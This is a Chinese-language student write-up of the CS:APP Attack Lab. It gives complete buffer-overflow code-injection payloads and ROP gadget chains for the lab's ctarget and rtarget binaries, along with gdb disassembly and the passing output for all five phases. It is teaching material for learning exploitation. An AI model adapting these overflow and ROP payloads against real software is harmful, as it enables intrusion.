#csapp #csapplab 

# 介绍
- Phase 1~3: 利用栈溢出攻击
- Phase 4~5: 利用ROP攻击
ctarget 和 rtarget都用getbuf函数读取输入:
```C
unsigned getbuf(){
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```
`Gets()`函数是和 `gets()`函数相似,不进行边界检查.这是溢出的利用点.

## ROP举例
目的:pop赋值0xBBBBBBBB给%rbx,然后复制给%rax
gadgets:
- address1:
```
	mov    %rbx,%rax
	ret
```
- address2:
```
	pop    %rbx
	ret
```
![[attachments/Pasted image 20250124180130.png|500]]


# 工具
## objdump
这一次,我需要用到objdump工具.这是是Linux下的反汇编目标文件或者可执行文件的命令.
使用
```shell
sudo apt-get update && sudo apt-get install binutils
```
安装包含odjdump的工具
```shell
objdump -d example.o > example.d
```
将目标文件反汇编成指令

## hex2raw
将十六进制数转换成字符串,例如
```
/* exploit.txt */
48 c7 c1 f0 11 40 00       /* mov $0x40011f0,%rcx */
68 ef cd ab 00             /* pushq $0xabcdef */ 
48 83 c0 11                /* add $0x11,%rax */ 
89 c2                      /* mov %eax,%edx */
```
可以用I/O重定向存储转换后的文件
```shell
./hex2raw < explot.txt > exploit-raw.txt
./ctarget < exploit-raw.txt
gdb ctarget
(gdb) r < exploit-raw.txt
```

## GDB
```shell
gcc -c example.s
```
产生汇编文件对应的目标文件.
当然,使用GDB的调试功能监视内存地址和寄存器也是必不可少的.我已经在Bomblab中掌握了.


# ctarget:Code Injection Attacks
`getbuf()`函数被 `test()`函数调用:
```C
void test(){
	int val;
	val = getbuf();
	printf("No exploit.  Getbuf return 0x%x\n", val);
}
```

## Phase 1
这个问题中,需要我修改返回地址,重定向到`touch1()`函数:
```C
void touch1(){
	vlevel = 1;
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);	
}
```
首先,我反汇编 `getbuf()`函数:
```
(gdb) disass getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```
非常简单,首先%rsp减去40字节,此时的%rsp作为buf指针传给 `Gets()`函数,调用 `Gets()`函数前返回地址设置为0x4017b4.
回顾[[机器级编程III(过程Procedure)#栈帧|栈帧]]的知识,如果我把返回地址覆写为`touch1()`函数的地址,就能跳转到`touch1()`函数.
寻找`touch1()`函数:
```shell
(gdb) disass touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    call   0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>
End of assembler dump.
```
填充的字节应为:
```
/* Phase1 */
ff ff ff ff ff ff ff ff /* %rsp~%rsp+7 */
ff ff ff ff ff ff ff ff /* %rsp+8~%rsp+15 */
ff ff ff ff ff ff ff ff /* %rsp+16~%rsp+23 */
ff ff ff ff ff ff ff ff /* %rsp+24~%rsp+31 */
ff ff ff ff ff ff ff ff /* %rsp+32~%rsp+39 */
c0 17 40                /* 0x4017c0 */
```
构造好后
```shell
./hex2raw < Phase1 > Phase1-raw 
```
执行
```shell
./ctarget -qi Phase1-raw
```
成功了!
```shell
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40
```




## Phase 2
这个问题不仅需要跳转到 `touch2()`函数,还需要修改%rdi寄存器的值传入我的cookie.
```C
void touch2(unsigned val){
	vlevel = 2;
	if(val==cookie){
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	}
	else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```
Handout提示我,这个问题需要注入代码.上课视频提到过本次lab没有使用栈随机化,这也是注入代码的前提.经过gdb调试,我发现在执行 `Gets()`函数前%rsp总是等于0x5561dc78,验证了这一点.
![[attachments/Pasted image 20250124224542.png|700]]
来看 `touch2()`函数汇编代码
```
(gdb) disassemble touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:    mov    $0x2,%edi
   0x000000000040181d <+49>:    call   0x401c8d <validate>
   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:    mov    $0x403110,%esi
   0x0000000000401829 <+61>:    mov    $0x1,%edi
   0x000000000040182e <+66>:    mov    $0x0,%eax
   0x0000000000401833 <+71>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:    mov    $0x2,%edi
   0x000000000040183d <+81>:    call   0x401d4f <fail>
   0x0000000000401842 <+86>:    mov    $0x0,%edi
   0x0000000000401847 <+91>:    call   0x400e40 <exit@plt>
End of assembler dump.
```
构造注入的代码,首先需要覆写返回地址,使其跳转到我注入代码的地址处.
```
	mov    $0x59b997fa, %edi       # 传入参数:我的cookie
	mov    $0x4017ec,%r8
	call   *%r8                    # 跳转到touch2函数(不能用call 0x4017ec,会跳转到相对地址)
```
把这个代码保存为Phase2.s.
获取以上代码的机器指令
```shell
gcc -c Phase2.s
objdump -d Phase2.o > Phase2.d
```
看看Phase2.d的输出:
```shell
$ cat Phase2.d
Phase2.o:     file format elf64-x86-64


Disassembly of section .text:

   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   49 c7 c0 ec 17 40 00    mov    $0x4017ec,%r8
   c:   41 ff d0                call   *%r8
```
然后把十六进制数输入Phase2文件
```
/* Phase2 */
bf fa 97 b9 59          /* mov    $0x59b997fa,%edi */
49 c7 c0 ec 17 40 00    /* mov    $0x4017ec,%r8 */
41 ff d0                /* call   *%r8 */
/* 以上15字节 */
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff
78 dc 61 55             /* 返回地址覆写为0x5561dc78 */
```
生成字符串
```shell
mv Phase2.s Phase2.d Phase2.o
./hex2raw < Phase2 > Phase2-raw
```
成功了!
```shell
$ ./ctarget -qi Phase2-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 49 C7 C0 EC 17 40 00 41 FF D0 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55
```


## Phase 3
Phase2中我给%rdi寄存器赋值传参,而这个问题需要以字符指针传参.
```C
void touch3(char *sval){
	vlevel = 3;
	if(hexmatch(cookie, sval)){
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	}
	else{
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}

int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```
查看 `touch3()`函数所在位置
```shell
(gdb) disassemble  touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:    mov    $0x0,%eax
   0x000000000040192c <+50>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>:    call   0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    call   0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   call   0x400e40 <exit@plt>
End of assembler dump.
```
不妨以栈顶指针为sval,构造注入代码
```
Phase3:
	mov    $0x5561dc78, %rdi
	mov    $0x4018fa,%r8
	sub    $0x28,%rsp
	call   *%r8
```
跟Phase2的操作一样,查看机器指令:
```shell
Phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <Phase3>:
   0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi
   7:   49 c7 c0 fa 18 40 00    mov    $0x4018fa,%r8
   e:   48 83 ec 28             sub    $0x28,%rsp
  12:   41 ff d0                call   *%r8
```
构造注入代码
```
/* Phase3 */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
48 c7 c7 78 dc 61 55                /* mov    $0x5561dc78,%rdi */
49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */
48 83 ec 30                         /* sub    $0x30,%rsp */
41 ff d0                            /* call   *%r8 */
/* 以上共30字节 */
ff ff ff ff ff ff ff ff ff ff 
81 dc 61 55 /* 返回地址覆写为0x5561dc81  %rsp+9 */
```
故技重施就成功了!
```shell
$ ./ctarget -qi Phase3-raw
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 48 C7 C7 78 DC 61 55 49 C7 C0 FA 18 40 00 48 83 EC 30 41 FF D0 FF FF FF FF FF FF FF FF FF FF 81 DC 61 55
```
这里我踩了一个坑.一开始我没有 `sub    $0x30,%rsp` 导致cookie字符串被覆写了,因为执行返回地址前栈底指针向上移动40字节,加上返回地址似乎pop了,所以栈底指针其实在0x5561dc78+0x28+0x8处.为了避免覆写我的cookie,应先将栈底指针减去48字节再调用 `call touch3`.

# rtaget:Return-Oriented Programming
为了应对以上ctarget的攻击方式,操作系统采用了栈随机化技术和将栈内存标记为不可执行.虽然不能自己注入代码了,但是现有的代码是可以执行的.这就是面向返回的编程(ROP).
ROP的策略是在现有程序的字节序列中抽取指令(以 `0xc3   /* ret */`结尾),被称为gadget.
farm.c文件为我提供了这些可用的指令集,称为gadget farm.在rtarget中,gadget farm以 `start_farm`函数起始,以 `end_farm`函数结尾.我在gdb中,首先分别找到了这两个函数所在的地址:
```shell
(gdb) disassemble start_farm
Dump of assembler code for function start_farm:
   0x0000000000401994 <+0>:     mov    $0x1,%eax
   0x0000000000401999 <+5>:     ret
End of assembler dump.
(gdb) disass end_farm
Dump of assembler code for function end_farm:
   0x0000000000401ab2 <+0>:     mov    $0x1,%eax
   0x0000000000401ab7 <+5>:     ret
End of assembler dump.
```
然后显示这两个地址之间内存的字节
```shell
(gdb) disass /r 0x401994,0x401ab7
Dump of assembler code from 0x401994 to 0x401ab7:
   0x0000000000401994 <start_farm+0>:   b8 01 00 00 00          mov    $0x1,%eax
   0x0000000000401999 <start_farm+5>:   c3                      ret
   0x000000000040199a <getval_142+0>:   b8 fb 78 90 90          mov    $0x909078fb,%eax
   0x000000000040199f <getval_142+5>:   c3                      ret
   0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
   0x00000000004019a6 <addval_273+6>:   c3                      ret
   0x00000000004019a7 <addval_219+0>:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
   0x00000000004019ad <addval_219+6>:   c3                      ret
   0x00000000004019ae <setval_237+0>:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
   0x00000000004019b4 <setval_237+6>:   c3                      ret
   0x00000000004019b5 <setval_424+0>:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
   0x00000000004019bb <setval_424+6>:   c3                      ret
   0x00000000004019bc <setval_470+0>:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
   0x00000000004019c2 <setval_470+6>:   c3                      ret
   0x00000000004019c3 <setval_426+0>:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
   0x00000000004019c9 <setval_426+6>:   c3                      ret
   0x00000000004019ca <getval_280+0>:   b8 29 58 90 c3          mov    $0xc3905829,%eax
   0x00000000004019cf <getval_280+5>:   c3                      ret
   0x00000000004019d0 <mid_farm+0>:     b8 01 00 00 00          mov    $0x1,%eax
   0x00000000004019d5 <mid_farm+5>:     c3                      ret
   0x00000000004019d6 <add_xy+0>:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
   0x00000000004019da <add_xy+4>:       c3                      ret
   0x00000000004019db <getval_481+0>:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
   0x00000000004019e0 <getval_481+5>:   c3                      ret
   0x00000000004019e1 <setval_296+0>:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)
   0x00000000004019e7 <setval_296+6>:   c3                      ret
   0x00000000004019e8 <addval_113+0>:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
   0x00000000004019ee <addval_113+6>:   c3                      ret
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004019ef <addval_490+0>:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax
   0x00000000004019f5 <addval_490+6>:   c3                      ret
   0x00000000004019f6 <getval_226+0>:   b8 89 d1 48 c0          mov    $0xc048d189,%eax
   0x00000000004019fb <getval_226+5>:   c3                      ret
   0x00000000004019fc <setval_384+0>:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)
   0x0000000000401a02 <setval_384+6>:   c3                      ret
   0x0000000000401a03 <addval_190+0>:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
   0x0000000000401a09 <addval_190+6>:   c3                      ret
   0x0000000000401a0a <setval_276+0>:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)
   0x0000000000401a10 <setval_276+6>:   c3                      ret
   0x0000000000401a11 <addval_436+0>:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
   0x0000000000401a17 <addval_436+6>:   c3                      ret
   0x0000000000401a18 <getval_345+0>:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax
   0x0000000000401a1d <getval_345+5>:   c3                      ret
   0x0000000000401a1e <addval_479+0>:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax
   0x0000000000401a24 <addval_479+6>:   c3                      ret
   0x0000000000401a25 <addval_187+0>:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
   0x0000000000401a2b <addval_187+6>:   c3                      ret
   0x0000000000401a2c <setval_248+0>:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)
   0x0000000000401a32 <setval_248+6>:   c3                      ret
   0x0000000000401a33 <getval_159+0>:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
   0x0000000000401a38 <getval_159+5>:   c3                      ret
   0x0000000000401a39 <addval_110+0>:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
   0x0000000000401a3f <addval_110+6>:   c3                      ret
   0x0000000000401a40 <addval_487+0>:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
   0x0000000000401a46 <addval_487+6>:   c3                      ret
   0x0000000000401a47 <addval_201+0>:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
   0x0000000000401a4d <addval_201+6>:   c3                      ret
   0x0000000000401a4e <getval_272+0>:   b8 99 d1 08 d2          mov    $0xd208d199,%eax
   0x0000000000401a53 <getval_272+5>:   c3                      ret
   0x0000000000401a54 <getval_155+0>:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax
   0x0000000000401a59 <getval_155+5>:   c3                      ret
   0x0000000000401a5a <setval_299+0>:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
   0x0000000000401a60 <setval_299+6>:   c3                      ret
   0x0000000000401a61 <addval_404+0>:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax
   0x0000000000401a67 <addval_404+6>:   c3                      ret
   0x0000000000401a68 <getval_311+0>:   b8 89 d1 08 db          mov    $0xdb08d189,%eax
   0x0000000000401a6d <getval_311+5>:   c3                      ret
   0x0000000000401a6e <setval_167+0>:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
   0x0000000000401a74 <setval_167+6>:   c3                      ret
   0x0000000000401a75 <setval_328+0>:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)
   0x0000000000401a7b <setval_328+6>:   c3                      ret
   0x0000000000401a7c <setval_450+0>:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)
   0x0000000000401a82 <setval_450+6>:   c3                      ret
   0x0000000000401a83 <addval_358+0>:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
   0x0000000000401a89 <addval_358+6>:   c3                      ret
   0x0000000000401a8a <addval_124+0>:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax
   0x0000000000401a90 <addval_124+6>:   c3                      ret
   0x0000000000401a91 <getval_169+0>:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax
   0x0000000000401a96 <getval_169+5>:   c3                      ret
   0x0000000000401a97 <setval_181+0>:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)
   0x0000000000401a9d <setval_181+6>:   c3                      ret
   0x0000000000401a9e <addval_184+0>:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax
   0x0000000000401aa4 <addval_184+6>:   c3                      ret
   0x0000000000401aa5 <getval_472+0>:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax
   0x0000000000401aaa <getval_472+5>:   c3                      ret
   0x0000000000401aab <setval_350+0>:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
   0x0000000000401ab1 <setval_350+6>:   c3                      ret
   0x0000000000401ab2 <end_farm+0>:     b8 01 00 00 00          mov    $0x1,%eax
End of assembler dump.
```
或者,利用提供的farm.c文件:
```shell
gcc -c farm.c
objdump -d farm.o > farm.s
```
得到的farm.s文件与以上gdb结果理论上应该相同,但是我发现不同,farm.s每个函数都多了 `push`,`pop`这些操作,这是 [[机器级编程III(过程Procedure)#寄存器保存约定|被调用者保存的约定]] ,我猜这是编译器优化行为并且认为应该采用gdb中的结果.将以上gdb反汇编结果保存为farm.d,熟练使用vim查找功能抽取指令.

## Phase 4
Handout中提示我,这个问题使用两个gadget和 `pop` 指令,注入的字符串包括数据部分.既然使用两个gadget,那就需要用到 `test`函数以及调用`test`函数的栈帧.在gdb中
```shell
b test
layout asm 
layout regs
r -q
```
可以发现 `test`函数的栈帧为8字节,其上的0x402044似乎为另一个函数的地址.一看果然
![[attachments/Pasted image 20250125163221.png|700]]

结合ctarget中对 `getbuf`函数的认识,我可以画出获取输入时栈的情况:

|栈空间|
|:---:|
|(launch函数栈帧)|
|0x402044 <launch+112>|
|(test函数栈帧)|
|8字节|
|0x401976 <test+14>|
|(getbuff函数栈帧)|
|40字节buffer|
最直接的解法思路自然就是

|栈空间|填充|
|:---:|:---:|
|(launch函数栈帧)|
|0x4017ec|return address 
|(test函数栈帧)|
|8字节|cookie
|`5f c3`所在的地址 |gadget address 1
|(getbuff函数栈帧)|
|40字节buffer|填充任意字符
其中
```
gadget 1:
	pop    %rdi
	ret

return address:
	0x4017ec <touch2>
```
gadget address1 对应的字节指令是`5f c3`,但是在farm.d中找不到,只好借助中间变量
注意到
```
0x00000000004019a7 <addval_219+0>:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
# 58 90 c3 :	pop		%rax;ret
0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :		movq	%rax,%rdi;ret
```
所以gadget应该设计为:
```
gadget 1:
	pop    %rax
	ret

gedget 2:
	movq    %rax,%rdi
	ret
```
相应地,栈空间应该设计为:

|栈空间|填充|
|:---:|:---:|
|(launch函数栈帧)|
|0x4017ec|touch2 address
|0x4019a2|gadget address 2
|(test函数栈帧)|
|8字节|cookie
|0x4019ab|gadget address 1
|(getbuff函数栈帧)|
|40字节buffer|填充任意字符
根据以上设计,填充的字符串为
```
/* Phase4 */
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
/* 以上40字节 */
ab 19 40 00 00 00 00 00 /* gadget address 1 */
fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ec 17 40 00 00 00 00 00 /* touch2 address */
```
成功了!
```shell
$ ./rtarget -qi Phase4-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```
执行返回地址的时候栈顶指针已经在这块8字节地址内存的上方了.
遇到`ret`指令时,实质是将此时的栈顶指针上方当作返回地址取出并跳转.


## Phase 5
根据Handout的提示,可能需要用到8个gadget
注意到
```
	0x0000000000401a03 <addval_190+0>:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
# 48 89 e0 c3:  movq     %rsp,%rax;ret
	0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :     movq    %rax,%rdi;ret
```
如何在栈空间中连续存放字符串呢?我注意到farm.c文件中有一个 `add_xy`函数:
```C
long add_xy(long x, long y)  
{  
    return x+y;  
}
```
利用这个函数来计算字符串存放的位置相对于%rsp的偏移量
设计gadget:
```
gadget 1:    # 0x401a06
	movq    %rsp,%rax
	ret

gadget 2:    # 0x4019a2
	movq    %rax,%rdi
	ret
# 以上,将%rsp处的值复制给了%rdi

gadget 3:    # 0x4019ab
	pop    %rax
	ret

gadget 4:    # 0x4019dd
	movl    %eax,%edx
	ret

gadget 5:    # 0x401a34
	cmpb    %cl,cl
	movl    %edx,%ecx
	ret

gadget 6:    # 0x401a13
	movl    %ecx,%esi
# 以上,将偏移量传给%esi.我本来是要相减的,但突然想起来movl会将高位全部设置成0,行不通了,只能向上方偏移.

gadget 7:    # 0x4019d6
	lea    (%rdi,%rsi,1),%rax
	ret

gadget 8:    # 0x4019a2
	movq    %rax,%rdi
	ret
# 以上,将字符串指针传递给%rdi
 touch3 address:0x4018fa
```
覆写 `getbuf`函数的返回地址为gadget address 1,之上为gadget address 2,以此类推,
栈空间应该为

|栈空间|填充|备注|
|:---:|:---:|:---:|
|(launch函数栈帧)| |
|0x35 0x39...|cookie string|
|0x4018fa|touch3 address|
|0x4019a2|gadget address 8|
|0x4019d6|gadget address 7|
|0x401a13|gadget address 6|
|0x401a34|gadget address 5|
|0x4019dd|gadget address 4|
|0x48|0x48|偏移量
|0x4019ab|gadget address 3|
|0x4019a2|gadget address 2|执行gadget 1时的%rsp
|(test函数栈帧)||
|0x401a06|gadget address 1|
|(getbuff函数栈帧)||
|40字节buffer|任意填充字符|

根据以上设计,填充的字符串为
```
/* Phase5 */
ff ff ff ff ff ff ff ff ff ff                               
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff    
ff ff ff ff ff ff ff ff ff ff
/* 以上共40字节 */
06 1a 40 00 00 00 00 00 /* gadget address 1 */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ab 19 40 00 00 00 00 00 /* gadget address 3 */
48 00 00 00 00 00 00 00 /* 偏移量:8*9 */
dd 19 40 00 00 00 00 00 /* gadget address 4 */
34 1a 40 00 00 00 00 00 /* gadget address 5 */
13 1a 40 00 00 00 00 00 /* gadget address 6 */
d6 19 40 00 00 00 00 00 /* gadget address 7 */
a2 19 40 00 00 00 00 00 /* gadget address 8 */
fa 18 40 00 00 00 00 00 /* touch3 address */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
```
大功告成!
```shell
$ ./rtarget -qi Phase5-raw
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

# 总结
PKU甚至CMU的不少学生都焦头烂额的实验,我独立完成,真是天才如我.只觉得什么CTF,逆向,pwn,也不过如此.